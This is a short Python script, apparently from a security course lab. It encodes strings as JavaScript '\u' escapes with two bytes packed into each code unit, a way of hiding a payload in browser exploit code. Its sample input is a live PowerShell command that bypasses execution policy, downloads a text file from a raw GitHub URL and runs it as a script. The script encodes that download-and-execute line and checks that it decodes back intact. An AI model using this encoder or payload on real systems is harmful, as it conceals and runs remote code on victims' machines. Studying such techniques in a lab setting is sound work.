def to_js_little_endian_escapes(s: str) -> str:
   
    escapes = []
    i = 0
    while i < len(s):
        low = ord(s[i])
        high = ord(s[i + 1]) if i + 1 < len(s) else 0  # 0 if odd length
        value = (high << 8) | low
        escapes.append(f'\\u{value:04x}')
        i += 2
    return ''.join(escapes)

def from_js_little_endian_escapes(escaped: str) -> str:
   
    import re
    parts = re.findall(r'\\u([0-9a-fA-F]{4})', escaped)
    chars = []
    for p in parts:
        v = int(p, 16)
        low = v & 0xff
        high = (v >> 8) & 0xff
        chars.append(chr(low))
        if high != 0:
            chars.append(chr(high))
    return ''.join(chars)

if __name__ == '__main__':
    sample = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -Command "[scriptblock]::Create((Invoke-WebRequest "https://raw.githubusercontent.com/arsiddiqui/CSC846_Falls2025/refs/heads/main/Lab08/test.txt").Content).Invoke();"'   # raw string literal recommended for backslashes
    escaped = to_js_little_endian_escapes(sample)
    print('Input :', sample)
    print('Escaped:', escaped)

    # verify round-trip
    original = from_js_little_endian_escapes(escaped)
    print('Round-trip ok:', original == sample)

